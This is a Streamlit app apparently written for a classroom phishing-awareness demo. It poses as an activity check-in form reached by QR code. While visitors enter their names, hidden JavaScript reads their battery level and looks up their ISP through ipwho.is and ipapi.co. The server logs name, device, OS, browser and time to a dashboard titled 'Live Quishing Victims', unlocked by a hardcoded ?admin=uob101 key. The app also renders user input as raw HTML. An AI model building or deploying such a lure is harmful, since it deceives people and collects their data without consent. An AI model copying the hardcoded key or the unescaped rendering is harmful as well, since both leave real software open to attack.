import re
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime, timezone, timedelta

st.set_page_config(
    page_title="ITCE101 Check-In",
    page_icon="📱",
    layout="centered"
)

# --- 1. SHARED IN-MEMORY LOGS ---
@st.cache_resource
def get_scan_logs():
    return []

scan_logs = get_scan_logs()

# Capture battery level & ISP from browser if provided via query params
battery_from_url = st.query_params.get("bat")
if battery_from_url:
    st.session_state["battery_level"] = battery_from_url

isp_from_url = st.query_params.get("isp")
if isp_from_url:
    st.session_state["visitor_isp"] = isp_from_url

components.html(
    """
    <script>
    (async () => {
        try {
            const parentUrl = new URL(window.parent.location.href);
            let changed = false;

            if (navigator.getBattery && !parentUrl.searchParams.get("bat")) {
                const bat = await navigator.getBattery();
                const pct = Math.round(bat.level * 100) + "%";
                parentUrl.searchParams.set("bat", pct);
                changed = true;
            }

            if (!parentUrl.searchParams.get("isp")) {
                let ispName = "";

                // Attempt 1: ipwho.is
                try {
                    const r1 = await fetch("https://ipwho.is/");
                    if (r1.ok) {
                        const d1 = await r1.json();
                        if (d1.success && d1.connection) {
                            ispName = d1.connection.isp || d1.connection.org || "";
                        }
                    }
                } catch (e) {}

                // Attempt 2: ipapi.co fallback
                if (!ispName) {
                    try {
                        const r2 = await fetch("https://ipapi.co/json/");
                        if (r2.ok) {
                            const d2 = await r2.json();
                            if (!d2.error) {
                                ispName = d2.org || d2.isp || "";
                            }
                        }
                    } catch (e) {}
                }

                if (ispName) {
                    if (
                        ispName.toLowerCase().includes("bahrain") &&
                        ispName.toLowerCase().includes("university")
                    ) {
                        ispName = "🏫 UOB Wi-Fi";
                    }
                    parentUrl.searchParams.set("isp", ispName);
                    changed = true;
                }
            }

            if (changed) {
                window.parent.location.replace(parentUrl.toString());
            }
        } catch (e) {}
    })();
    </script>
    """,
    height=0,
)

# --- 2. SECRET PRESENTER DASHBOARD (Open on your phone with ?admin=uob101) ---
if st.query_params.get("admin") == "uob101":
    st.title("🕵️ Live Quishing Victims")
    st.caption("Presenter Mobile View • UOB ITCE101")

    st.metric("Total Classmates Tricked", len(scan_logs))
    if st.button("🔄 Refresh List", use_container_width=True):
        st.rerun()

    if scan_logs:
        st.dataframe(scan_logs, use_container_width=True)
    else:
        st.info("Waiting for classmates to enter their names...")

    with st.expander("🛠️ Debug Params & Headers"):
        st.write("Query Params:", dict(st.query_params))
        st.json(dict(st.context.headers))

    st.divider()
    if st.button("🗑️ Clear Logs"):
        scan_logs.clear()
        st.rerun()

    st.stop()

# --- 3. HELPER TO PARSE DEVICE INFO ---
def parse_device(headers):
    ua = headers.get("User-Agent", "Unknown")
    ch_model = headers.get("Sec-Ch-Ua-Model", "").strip('"')

    if "iPhone" in ua:
        os_name, model = "Apple iOS", "Apple iPhone"
    elif "iPad" in ua:
        os_name, model = "Apple iPadOS", "Apple iPad"
    elif "Android" in ua:
        os_name = "Google Android"
        if ch_model and ch_model != "K":
            model = ch_model
        else:
            match = re.search(r"Android [^;]+;\s*([^;)]+)", ua)
            raw_m = match.group(1).replace("Build/", "").strip() if match else "Android Phone"
            model = "Android Phone" if raw_m == "K" else raw_m
    elif "Windows" in ua:
        os_name, model = "Windows", "Windows PC"
    elif "Mac" in ua:
        os_name, model = "macOS", "Apple Mac"
    else:
        os_name, model = "Unknown", "Unknown Device"

    if "CriOS" in ua or ("Chrome" in ua and "Edg" not in ua):
        browser = "Chrome"
    elif "Safari" in ua and "Chrome" not in ua:
        browser = "Safari"
    elif "Edg" in ua:
        browser = "Edge"
    elif "Firefox" in ua:
        browser = "Firefox"
    else:
        browser = "In-App Browser"

    return os_name, model, browser

# --- 4. STEP 1: THE BAIT SCREEN ---
if "submitted_name" not in st.session_state:
    st.title("Quick Activity Registration")
    st.write("Enter your name below:")

    with st.form("checkin_form"):
        visitor_name = st.text_input("What's your name?", placeholder="Type your first name...")
        submitted = st.form_submit_button("Continue →", use_container_width=True)

        if submitted:
            clean_name = visitor_name.strip()
            if not clean_name:
                st.warning("Please enter your name first!")
            else:
                headers = st.context.headers
                os_name, model, browser = parse_device(headers)
                bh_time = datetime.now(timezone(timedelta(hours=3))).strftime("%I:%M:%S %p")
                battery = (
                    st.session_state.get("battery_level")
                    or st.query_params.get("bat")
                    or "N/A (Blocked/iOS)"
                )
                isp = (
                    st.session_state.get("visitor_isp")
                    or st.query_params.get("isp")
                    or "Private / Blocked"
                )

                scan_logs.append({
                    "Name": clean_name,
                    "Device": model,
                    "OS": os_name,
                    "Browser": browser,
                    "Battery": battery,
                    "ISP": isp,
                    "Time": bh_time
                })

                st.session_state.submitted_name = clean_name
                st.rerun()

# --- 5. STEP 2: ONLY THE "Wait!" MESSAGE ---
else:
    name = st.session_state.submitted_name
    st.markdown(
        f"""
        <div style="text-align: center; margin-top: 80px;">
            <h1 style="font-size: 3.2rem; color: #FF4B4B;">PLEASE WAIT, {name.upper()}!</h1>
        </div>
        """,
        unsafe_allow_html=True
    )